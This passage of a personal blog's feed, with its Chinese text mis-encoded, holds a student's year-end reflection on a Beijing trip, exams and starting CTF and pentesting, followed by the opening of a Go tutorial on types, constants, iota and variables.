å¤©ç©ºé—²æ—¶é—´ï¼Œäºæ˜¯å»äº†ä¸€è¶ŸåŒ—äº¬ã€‚è¿™è¶ŸåŒ—äº¬ä¹‹æ—…æ˜¯äººç”Ÿä¸­ä¸èƒ½å¿˜è®°çš„ä½“éªŒï¼Œé¢†ç•¥åˆ°äº†åŒ—å¹³çš„å†¬ï¼Œæ‰“å¡äº†å¾ˆå¤šåœ°æ–¹åƒäº†å¾ˆå¤šç‰¹è‰²ç¾é£Ÿï¼Œç«™åœ¨ä»€åˆ¹æµ·è¾¹å¹ç€é£ä¸ç¦æƒ³èµ·äº†èµµé›·ã€Šé¼“æ¥¼ã€‹ä¸­çš„é‚£å¥æ­Œè¯ï¼šæˆ‘ç«™åœ¨ä»€åˆ¹æµ·è¾¹ï¼Œä¸€åˆ‡çš„ç”œèœœéƒ½ä¸æˆ‘æ— å…³ï¼Œè¿™æ˜¯ä¸ªæ‹¥æŒ¤çš„åœ°æ–¹ã€‚ä½“éªŒåˆ°äº†äººç”Ÿä¸­çš„ç¬¬ä¸€åœºæ»‘é›ªï¼Œå—æ–¹å­©å­ç‹‚å–œï¼è¿˜å»é€›äº†æ¸…åå’ŒåŒ—å¤§ï¼Œå»åˆ°äº†åŒ—å¤§çš„æœªåæ¹–ç•”ï¼Œåœ¨æ¸…åäº²çœ¼çœ‹åˆ°äº†æ›¾ç»æ¿€åŠ±æˆ‘çš„é‚£å¥è¯ï¼šâ€œæˆ‘å¯ä»¥å‘Šè¯‰ä½ å½“å¹´æˆ‘ä¹Ÿä¸€æ ·éƒé—·å—ï¼Ÿâ€ï¼Œè‚‰çœ¼å¯è§ä»–ä»¬çš„ç²¾ç¥é£è²ŒçœŸçš„ä¸æˆ‘ä»¬ä¸ä¸€æ ·ï¼Œä»–ä»¬è‡ªä¿¡æ˜‚æ‰¬å……æ»¡æ¿€æƒ…ï¼Œå›¾ä¹¦é¦†é‡Œã€æ•™å­¦æ¥¼é‡Œã€æ¥¼é“é‡Œç”šè‡³é£Ÿå ‚é‡Œé¢éƒ½å……æ»¡äº†ä»–ä»¬å­¦ä¹ çš„èº«å½±ï¼Œé«˜ç­‰å­¦åºœæµ“åšçš„å­¦æœ¯æ°›å›´ç€å®è®©äººç¾¡æ…•ã€‚åœ¨å¤©å®‰é—¨æ’äº† 13 ä¸ªå°æ—¶çš„é˜Ÿå¹äº†ä¸€å¤œçš„å†·é£ï¼Œç»ˆäºç«™åœ¨ç¬¬ä¸€æ’çœ‹ç€å†‰å†‰å‡èµ·çš„äº”æ˜Ÿçº¢æ——è¿æ¥ 2025 ç¬¬ä¸€ä¸ªæ™¨æ›¦ï¼Œå†›ä¹é˜Ÿã€å’Œå¹³é¸½éƒ½å¾ˆå¹¸è¿åœ°è§åˆ°äº†ï¼Œç°åœºç‰¹åˆ«éœ‡æ’¼ï¼Œå¤§å®¶éƒ½ç‰¹åˆ«æ¿€åŠ¨ï¼Œæ‹äº†å¾ˆå¤šç…§ç‰‡å’Œè§†é¢‘ï¼ˆèµ·ç æ‹äº†å‡ ç™¾å¼ hhhhhhhï¼‰ï¼Œè¿æ°”çœŸçš„å¾ˆå¥½ï¼Œç¬¬ä¸€æ¬¡æ¥çœ‹å‡æ——å°±ç«™åˆ°äº†ç¬¬ä¸€æ’owoã€‚ä»æ¥æ²¡æƒ³è¿‡å°æ—¶å€™åªèƒ½åœ¨ç”µè§†é‡Œè§åˆ°çš„é¦–éƒ½è‡ªå·±èƒ½åœ¨ 18 å²æ—¶è¸è¶³äºæ­¤ã€‚</p><p>â€‹å¿«ä¹æ˜¯çŸ­æš‚çš„ï¼Œå›å­¦æ ¡çš„ç¬¬äºŒå¤©å°±æ˜¯è€ƒè¯•ï¼Œç­‰ç€æˆ‘çš„æ˜¯ 4 é—¨è€ƒè¯•ï¼‹IT å®ä¹ å‘œå‘œå‘œå‘œå‘œï¼Œè°å®¶å­¦æ ¡ä¸€å­¦æœŸè€ƒ12 é—¨å•Šå•Šå•Šå•Šå•Šå•Šï¼ˆè¢«ä¿¡æ¯å®‰å…¨æ¦‚è®ºèƒŒåˆºäº†å±…ç„¶è¿˜è€ƒæ ˆæº¢å‡ºâŠ™ï¹âŠ™ï¼‰ï¼Œæ•°æ®é€šä¿¡æˆ‘çˆ±ä½ å‘œå‘œå‘œå‘œå‘œã€‚</p><p>â€‹å¯’å‡ä»¥ CTF å¼€å§‹ï¼ˆohï¼Œno æˆ’ä¸æ‰äº†ï¼‰ï¼Œç„¶åå¼€å§‹ä»é›¶å¼€å§‹çš„æ¸—é€ä¹‹è·¯ï¼ˆéœ€è¦å­¦çš„å¥½å¤šä½†æ˜¯å¥½æœ‰è¶£wuwï¼‰å’ŒæŒ–æ´ï¼ˆåˆ°åº•æ€æ ·æ‰èƒ½è‡ªå·±æŒ–åˆ°å“‡qwqï¼‰ã€‚æ‰“äº†è¥¿æ¹–è®ºå‰‘ï¼ˆçˆ†é›¶äº†ï¼‰å’Œæ˜¥ç§‹æ¯ï¼ˆåç‰¢ï¼‰ï¼Œåœ¨æŸå¤©æ™šä¸Šå¿ƒè¡€æ¥æ½®åˆå¼€å§‹å­¦ go è¯­è¨€ï¼Œgogogoï¼å¤§å‡ºè¡€ä¹°äº†äººç”Ÿä¸­ç¬¬ä¸€å°ç›¸æœºï¼ŒLUMIXï¼Œå¥½å–œæ¬¢ï¼ã€‚</p><p>â€‹è¿™ä¸€å¹´å·®ä¸å¤šå°±è¿™æ ·ç»“æŸäº†ï¼Œæ„Ÿè§‰è‡ªå·±å¾ˆå¹¸è¿ï¼Œé‡åˆ°äº†å¾ˆå¤šå¾ˆå¥½çš„äººï¼Œè·Ÿå‰å®³çš„å¸ˆå‚…ä»¬ä¹Ÿäº¤æµè¿‡å¥½å¤šï¼Œæœ‰é—®é¢˜çš„æ—¶å€™å¤§å®¶éƒ½ä¼šæ¯«ä¸åå•¬åœ°ä¸ºæˆ‘æä¾›å¸®åŠ©ï¼ŒçœŸçš„éå¸¸éå¸¸éå¸¸éå¸¸éå¸¸éå¸¸æ„Ÿè°¢å¸ˆå‚…ä»¬ï¼ˆï¼¾ï½ï¼¾ï¼‰ï¼ˆ90Â°é èº¬ï¼‰ã€‚é©¬ä¸Šå°±æ˜¯å¤§å¹´åˆä¸€äº†ï¼ŒçœŸæ­£æ„ä¹‰ä¸Šçš„æ–°çš„ä¸€å¹´ï¼Œä»Šå¹´çš„åå·ï¼Œæ˜¯ä¸ºäº†æ˜å¹´æ›´å¥½çš„ç›¸é‡ï¼Œâ€œä½•æ—¶è‘¡è„å…ˆç†Ÿé€ ä½ è¦é™å€™å†é™å€™â€ï¼ˆæ„Ÿè§‰è‡ªå·±å˜å¾—ä½›ç³»äº†hhhhhï¼‰ã€‚æ¸æ¸åœ°æˆ‘ä¹Ÿæ˜ç™½åªæœ‰è‡ªå·±æ‰æ˜¯æœ€çè´µçš„ï¼Œäººå„æœ‰å„ï¼Œä¸è¿‡å°”å°”ã€‚å¸Œæœ›æœªæ¥çš„æˆ‘èƒ½æ‹¥æœ‰ä¸€é¢—åƒä¹Œè¨å¥‡ä¸€æ ·åšå¼ºã€ç¨³å®šã€å‹‡æ•¢çš„å¿ƒå’Œä¹è§‚çš„å¿ƒæ€ï¼Œ2025ï¼Œè¦åƒå¸ˆçˆ¶è¯´çš„é‚£æ ·ï¼šæ–°çš„ä¸€å¹´æŠ€æœ¯æ›´ä¸Šä¸€å±‚æ¥¼ï¼åšå®šè‡ªä¿¡æ›´åŠªåŠ›åœ°ç»§ç»­å‘å‰å¥”è·‘ï¼Œå»æˆä¸ºä¸€ä¸ªçœŸæ­£å‰å®³çš„äººã€‚</p><p><img src="https://img.dkdun.cn/v1/2025/12/93096e631b884738.png"></p>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:ä»é›¶å¼€å§‹çš„ Go ä¹‹æ—…-æ•°æ®ç±»å‹&amp;å¸¸é‡&amp;å˜é‡&amp;è¾“å…¥è¾“å‡º</title>
    <link href="/2025/01/22/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/01/22/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>éƒ¨åˆ†å†…å®¹å’Œ C è¯­è¨€çš„æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥å°±åªè®°äº†ä¸ä¸€æ ·çš„</p><span id="more"></span><h1 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h1><h2 id="å­—ç¬¦ç±»å‹"><a href="#å­—ç¬¦ç±»å‹" class="headerlink" title="å­—ç¬¦ç±»å‹"></a>å­—ç¬¦ç±»å‹</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-type">byte</span>ç­‰ä»· <span class="hljs-type">uint8</span> å¯ä»¥è¡¨è¾¾ ASCII å­—ç¬¦<br><span class="hljs-type">rune</span>ç­‰ä»· <span class="hljs-type">int32</span> å¯ä»¥è¡¨è¾¾ Unicode å­—ç¬¦<br><span class="hljs-type">string</span>å­—ç¬¦ä¸²å³å­—èŠ‚åºåˆ—ï¼Œå¯ä»¥è½¬åŒ–ä¸º []<span class="hljs-type">byte</span> ç±»å‹å³å­—èŠ‚åˆ‡ç‰‡<br></code></pre></td></tr></table></figure><h2 id="æ´¾ç”Ÿç±»å‹"><a href="#æ´¾ç”Ÿç±»å‹" class="headerlink" title="æ´¾ç”Ÿç±»å‹"></a>æ´¾ç”Ÿç±»å‹</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">æ•°ç»„[<span class="hljs-number">1</span>]<span class="hljs-type">int</span>é•¿åº¦ä¸º <span class="hljs-number">1</span> çš„æ•´å‹æ•°ç»„<br>åˆ‡ç‰‡[]<span class="hljs-type">float64</span><span class="hljs-number">64</span>ä½æµ®ç‚¹æ•°åˆ‡ç‰‡<br>æ˜ å°„è¡¨<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>é”®ä¸ºå­—ç¬¦ä¸²,å€¼ä¸ºæ•´å‹çš„æ˜ å°„è¡¨<br>ç»“æ„ä½“<span class="hljs-keyword">type</span> Gopher <span class="hljs-keyword">struct</span>&#123;&#125;Gopher ç»“æ„ä½“<br>æŒ‡é’ˆ*<span class="hljs-type">int</span><br>å‡½æ•°<span class="hljs-keyword">type</span> f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>æ— å‚æ— è¿”å›å€¼çš„å‡½æ•°<br>æ¥å£<span class="hljs-keyword">type</span> Gopher <span class="hljs-keyword">interface</span>&#123;&#125;Gopher æ¥å£<br>é€šé“<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>æ•´å‹é€šé“<br></code></pre></td></tr></table></figure><h2 id="é›¶å€¼"><a href="#é›¶å€¼" class="headerlink" title="é›¶å€¼"></a>é›¶å€¼</h2><p>é›¶å€¼åˆç§°ä¸º <code>zero value</code> ï¼Œå¹¶ä¸æ˜¯æŒ‡æ•°å­—é›¶ ï¼Œè€Œæ˜¯è¯´ä¸€ä¸ªç±»å‹çš„ç©ºå€¼æˆ–é»˜è®¤å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">æ•°å­—ç±»å‹<span class="hljs-number">0</span><br>å¸ƒå°”ç±»å‹<span class="hljs-literal">false</span><br>å­—ç¬¦ä¸²ç±»å‹<span class="hljs-string">&quot;&quot;</span><br>æ•°ç»„å›ºå®šé•¿åº¦çš„å¯¹åº”ç±»å‹çš„é›¶å€¼é›†åˆ<br>ç»“æ„ä½“å†…éƒ¨å­—æ®µéƒ½æ˜¯é›¶å€¼çš„ç»“æ„ä½“<br>åˆ‡ç‰‡ã€æ˜ å°„è¡¨ã€å‡½æ•°ã€æ¥å£ã€æŒ‡é’ˆã€é€šé“<span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><h2 id="nil"><a href="#nil" class="headerlink" title="nil"></a>nil</h2><p><code>nil</code> ç±»ä¼¼äº C è¯­è¨€ä¸­çš„ <code>null</code> ï¼Œä½†æœ‰åŒºåˆ«ã€‚<code>nil</code> åªæ˜¯ä¸€äº›å¼•ç”¨ç±»å‹çš„é›¶å€¼ï¼Œå¹¶ä¸”ä¸å±äºä»»ä½•ç±»å‹ï¼Œä»…ä»…æ˜¯ä¸€ä¸ªå˜é‡ã€‚ </p><h1 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h1><h2 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><p>å¸¸é‡çš„å£°æ˜éœ€è¦ <code>const</code> å…³é”®å­—ï¼Œå¹¶ä¸”åœ¨åˆå§‹åŒ–æ—¶å¿…é¡»èµ‹å€¼ï¼Œä¸ç„¶æ— æ³•é€šè¿‡ç¼–è¯‘</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> name <span class="hljs-type">string</span> = <span class="hljs-string">&quot;butter&quot;</span> <span class="hljs-comment">// å­—é¢é‡</span><br><span class="hljs-keyword">const</span> msg = <span class="hljs-string">&quot;hello butt3rf1y&quot;</span> <span class="hljs-comment">// å­—é¢é‡</span><br><span class="hljs-keyword">const</span> num = <span class="hljs-number">114514</span> <span class="hljs-comment">// å­—é¢é‡</span><br><span class="hljs-keyword">const</span> numExpression = (<span class="hljs-number">1</span>+<span class="hljs-number">2</span>+<span class="hljs-number">3</span>) / <span class="hljs-number">2</span> % <span class="hljs-number">100</span> + num <span class="hljs-comment">// å¸¸é‡è¡¨è¾¾å¼</span><br></code></pre></td></tr></table></figure><p>æ‰¹é‡å£°æ˜å¸¸é‡å¯ä»¥ç”¨ <code>()</code> ï¼Œå¯ä»¥å­˜åœ¨å¤šä¸ª</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Count = <span class="hljs-number">1</span><br>   Name  = <span class="hljs-string">&quot;butter&quot;</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>   Size = <span class="hljs-number">14</span><br>   Len  = <span class="hljs-number">51</span><br>)<br></code></pre></td></tr></table></figure><p>åœ¨åŒä¸€ä¸ªå¸¸é‡ç»„ä¸­ï¼Œå¦‚æœå‰ä¸€ä¸ªå¸¸é‡èµ‹å€¼ä¸”åé¢æ²¡æœ‰èµ‹å€¼ï¼Œé‚£ä¹ˆé»˜è®¤åé¢çš„å’Œå‰é¢èµ‹å€¼å¸¸é‡å€¼ç›¸ç­‰ï¼Œä¹Ÿå°±æ˜¯è¯´å…¶å€¼é»˜è®¤å°±æ˜¯å‰é¢å¸¸é‡çš„å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>  A = <span class="hljs-number">1</span><br>  B <span class="hljs-comment">// 1</span><br>  C <span class="hljs-comment">// 1</span><br>  D <span class="hljs-comment">// 1</span><br>  E <span class="hljs-comment">// 1</span><br>)<br></code></pre></td></tr></table></figure><h2 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h2><p><code>iota</code> æ˜¯ä¸€ä¸ªå†…ç½®å¸¸é‡æ ‡è¯†ç¬¦ï¼Œè¡¨ç¤ºå¸¸é‡å£°æ˜ä¸­æ— ç±»å‹æ•´æ•°åºæ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> <span class="hljs-literal">iota</span> = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p> åˆ—å­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 0</span><br>   Num1 <span class="hljs-comment">// 1</span><br>   Num2 <span class="hljs-comment">// 2</span><br>   Num3 <span class="hljs-comment">// 3</span><br>   Num4 <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><p>ä¹Ÿèƒ½è¿™æ ·å†™</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span>*<span class="hljs-number">2</span> <span class="hljs-comment">// 0</span><br>   Num1 <span class="hljs-comment">// 2</span><br>   Num2 <span class="hljs-comment">// 4</span><br>   Num3 <span class="hljs-comment">// 6</span><br>   Num4 <span class="hljs-comment">// 8</span><br>)<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>   Num = <span class="hljs-literal">iota</span> &lt;&lt; <span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 1</span><br>   Num1 <span class="hljs-comment">// 13(iota &lt;&lt; 2) * 3 + 1</span><br>   Num2 <span class="hljs-comment">// 25</span><br>   Num3 = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 3</span><br>   Num4 <span class="hljs-comment">// 4</span><br>)<br></code></pre></td></tr></table></figure><p><code>iota</code> çš„å€¼æœ¬è´¨ä¸Šå°±æ˜¯ <code>iota</code> æ‰€åœ¨è¡Œç›¸å¯¹äºå½“å‰ <code>const</code> åˆ†ç»„çš„ç¬¬ä¸€è¡Œçš„å·®å€¼ã€‚è€Œä¸åŒçš„ <code>const</code> åˆ†ç»„åˆ™ç›¸äº’ä¸ä¼šå½±å“ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br>  Num  = <span class="hljs-literal">iota</span>&lt;&lt;<span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 1 ç¬¬ä¸€è¡Œ</span><br>  Num2 = <span class="hljs-literal">iota</span>&lt;&lt;<span class="hljs-number">2</span>*<span class="hljs-number">3</span> + <span class="hljs-number">1</span> <span class="hljs-comment">// 13 ç¬¬äºŒè¡Œ</span><br>  _ <span class="hljs-comment">// 25 ç¬¬ä¸‰è¡Œ</span><br>  Num3 <span class="hljs-comment">//37 ç¬¬å››è¡Œ</span><br>  Num4 = <span class="hljs-literal">iota</span> <span class="hljs-comment">// 4 ç¬¬äº”è¡Œ</span><br>  _ <span class="hljs-comment">// 5 ç¬¬å…­è¡Œ</span><br>  Num5 <span class="hljs-comment">// 6 ç¬¬ä¸ƒè¡Œ</span><br>)<br></code></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼š<code>iota</code> åœ¨ <code>const</code> å—ä¸­ä»0å¼€å§‹ï¼Œæ¯æ¬¡å®šä¹‰ä¸€ä¸ªæ–°å¸¸é‡æ—¶é€’å¢1ï¼Œç›´åˆ°ç”¨æ–°çš„ <code>const</code> é‡ç½®ã€‚å¦‚æœå¸¸é‡å®šä¹‰ä¸­æ²¡æœ‰æ˜¾å¼èµ‹å€¼ï¼Œåˆ™ä¼šç»§æ‰¿å‰ä¸€ä¸ªå¸¸é‡çš„è¡¨è¾¾å¼ã€‚å¹¶ä¸”<code>iota</code> çš„å€¼åœ¨æ˜¾å¼ä½¿ç”¨æ—¶æ‰ä¼šæ›´æ–°ã€‚</strong></p><h2 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h2><p>åœ¨ go ä¸­ï¼Œé€šè¿‡è‡ªå®šä¹‰ç±»å‹ + const + iota æ¥å®ç°æšä¸¾</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Season <span class="hljs-type">uint8</span><br><br><span class="hljs-keyword">const</span> (<br>Spring Season = <span class="hljs-literal">iota</span><span class="hljs-comment">//0</span><br>Summer<span class="hljs-comment">//1</span><br>Autumn<span class="hljs-comment">//2</span><br>Winter<span class="hljs-comment">//3</span><br>)<br></code></pre></td></tr></table></figure><p>æšä¸¾å‡ºæ¥çš„ç»“æœå®é™…ä¸Šå°±æ˜¯æ•°å­—ï¼Œgo ä¹Ÿä¸æ”¯æŒç›´æ¥å°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»™è‡ªå®šä¹‰ç±»å‹æ·»åŠ æ–¹æ³•æ¥è¿”å›å…¶å­—ç¬¦ä¸²è¡¨ç°å½¢å¼ï¼Œå®ç° <code>Stringer</code> æ¥å£å°±è¡Œ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s Season)</span></span> String() <span class="hljs-type">string</span> &#123;<br>  <span class="hljs-keyword">switch</span> s &#123;<br>  <span class="hljs-keyword">case</span> Spring:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;spring&quot;</span><br>  <span class="hljs-keyword">case</span> Summer:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;summer&quot;</span><br>  <span class="hljs-keyword">case</span> Autumn:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;autumn&quot;</span><br>  <span class="hljs-keyword">case</span> Winter:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;winter&quot;</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h1><h2 id="å£°æ˜"><a href="#å£°æ˜" class="headerlink" title="å£°æ˜"></a>å£°æ˜</h2><p>go ä¸­çš„å£°æ˜æ˜¯åç½®çš„ï¼Œå˜é‡çš„å£°æ˜ä¼šç”¨åˆ° <code>var</code> å…³é”®å­—ï¼Œæ ¼å¼ä¸º <code>var å˜é‡å ç±»å‹å</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> happy <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> intNUm <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> char <span class="hljs-type">byte</span><br></code></pre></td></tr></table></figure><p>å¦‚æœè¦å¤šä¸ªåŒæ ·ç±»å‹çš„å˜é‡æ—¶ï¼Œå¯ä»¥å†™åœ¨ä¸€èµ·</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> h1,h2,h3,h4 <span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><p>å£°æ˜å¤šä¸ªä¸åŒç±»å‹çš„å˜é‡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ <code>()</code>ï¼Œå¯ä»¥å­˜åœ¨å¤šä¸ª <code>()</code></p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-keyword">var</span> (<br>  name    <span class="hljs-keyword">string</span><br>  age     <span class="hljs-keyword">int</span><br>  address <span class="hljs-keyword">string</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>  school <span class="hljs-keyword">string</span><br>  <span class="hljs-keyword">class</span> <span class="hljs-keyword">int</span><br>)<br></code></pre></td></tr></table></figure><p><strong>æ³¨ï¼šå˜é‡å¦‚æœåªæ˜¯å£°æ˜è€Œä¸èµ‹å€¼ï¼Œé‚£ä¹ˆå˜é‡å­˜å‚¨çš„å€¼å°±æ˜¯å¯¹åº”ç±»å‹çš„é›¶å€¼ã€‚</strong></p><h2 id="èµ‹å€¼"><a href="#èµ‹å€¼" class="headerlink" title="èµ‹å€¼"></a>èµ‹å€¼</h2><p>è·Ÿ C è¯­è¨€è§„åˆ™å·®ä¸å¤šï¼Œä½†è¿˜å¯ä»¥åˆ†åˆ«èµ‹å€¼ï¼Œæ¯”å¦‚è¯´</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> name <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> age <span class="hljs-type">int</span><br>name, age = <span class="hljs-string">&quot;happy&quot;</span>, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯æ¯æ¬¡éƒ½è¦æŒ‡å®šç±»å‹ï¼Œè¿˜å¯ä»¥çŸ­å˜é‡åˆå§‹åŒ–ï¼Œçœç•¥ <code>var</code> å…³é”®å­—å’Œåç½®ç±»å‹ï¼Œç¼–è¯‘å™¨ä¼šè‡ªå·±åˆ¤æ–­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">&quot;happy&quot;</span><br></code></pre></td></tr></table></figure><p>è™½ç„¶å¯ä»¥ä¸ç”¨æŒ‡å®šç±»å‹ï¼Œä½†æ˜¯åœ¨åç»­èµ‹å€¼æ—¶ï¼Œç±»å‹å¿…é¡»ä¿æŒä¸€è‡´ï¼Œä¸ç„¶ä¸èƒ½é€šè¿‡ç¼–è¯‘ã€‚è¿˜å¾—æ³¨æ„çš„æ˜¯ï¼ŒçŸ­å˜é‡åˆå§‹åŒ–ä¸èƒ½ç”¨ <code>nil</code>ï¼Œå› ä¸º <code>nil</code> ä¸å±äºä»»ä½•ç±»å‹ï¼Œç¼–è¯‘å™¨æ— æ³•æ¨æ–­ã€‚</p><p>çŸ­å˜é‡è¿˜èƒ½æ‰¹é‡åˆå§‹åŒ–</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">name, age := <span class="hljs-string">&quot;happy&quot;</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>çŸ­å˜é‡å£°æ˜è™½ç„¶æ— æ³•å¯¹ä¸€ä¸ªå·²å­˜åœ¨çš„å˜é‡ä½¿ç”¨ï¼Œä½†æ˜¯åœ¨èµ‹å€¼æ—§å˜é‡çš„åŒæ—¶å£°æ˜ä¸€ä¸ªæ–°çš„å˜é‡æ—¶å¯ä»¥ä½¿ç”¨</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">a := <span class="hljs-number">1</span><br>a, b := <span class="hljs-number">2</span>, <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>åœ¨ go 